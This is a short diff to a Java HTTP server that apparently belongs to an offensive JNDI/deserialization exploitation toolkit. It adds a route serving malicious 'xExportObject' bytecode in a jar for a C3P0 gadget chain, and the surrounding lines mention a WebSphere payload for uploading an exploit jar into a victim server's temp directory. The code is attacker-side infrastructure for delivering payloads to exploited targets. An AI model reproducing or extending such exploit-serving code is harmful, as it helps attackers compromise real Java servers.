@@ -88,6 +88,13 @@ public class HttpServer implements HttpHandler {
 					System.out.println("Release stalling...");
 					break;
 
+				case "/xExportObject-sleepless.jar":
+					// Send xExportObject bytecode in a jar archive.
+					// Used for C3P0.
+					httpExchange.sendResponseHeaders(200, exportJar.length+1);
+					httpExchange.getResponseBody().write(exportJar);
+					break;
+
 				case "/upload.wsdl":
 					//payload for artsploit.controllers.WebSphere1-2
 					//intended to upload xExploitObject.jar into the /temp directory on server
